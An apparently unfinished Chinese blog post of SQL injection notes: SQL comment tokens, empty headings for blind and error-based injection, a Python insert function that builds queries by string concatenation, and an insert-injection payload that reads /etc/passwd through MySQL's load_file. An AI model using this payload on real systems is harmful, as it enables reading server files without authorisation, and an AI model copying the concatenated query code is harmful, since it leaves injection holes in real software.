---
title: 各类SQL注入payload
date: 2018-04-02 20:29:01
tags: Web安全
categories: Web安全
visible: hide
---

**数据库注释**

```
#
--
-- -
--+
//
/**/
/*letmetest*/
;
```

##select 注入

### 报错和有回显类

### 盲注

#### 布尔盲注

#### 时间盲注

##insert注入

```python

def index():
    form = PostForm()
    if form.validate_on_submit():
        res = mysql.Add("post", ['NULL', "'%s'" % form.post.data,
                                 "'%s'" % current_user.id, "'%s'" % now()])
#省略部分
```



```python
def Add(self, tablename, values):
        sql = "insert into " + tablename + " "
        sql += "values ("
        sql += "".join(i + "," for i in values)[:-1]
        sql += ")"
        try:
            self.db_session.execute(sql)
            self.db_session.commit()
            return 1
        except:
            return 0
```

  ```mysql
insert into 'tablename' values('NULL','123456',1,'2018-03-24T21:44:39Z'),(NULL,(select conv(hex(substr(load_file('/etc/passwd'),1,6)),16,10)),2,'2018-03-24T21:44:39Z')#)
  ```

```mysql
123456',1,'2018-03-24T21:44:39Z'),(NULL,(select conv(hex(substr(load_file('/etc/passwd'),1,6)),16,10)),2,'2018-03-24T21:44:39Z')#
```

## sqlmap payload





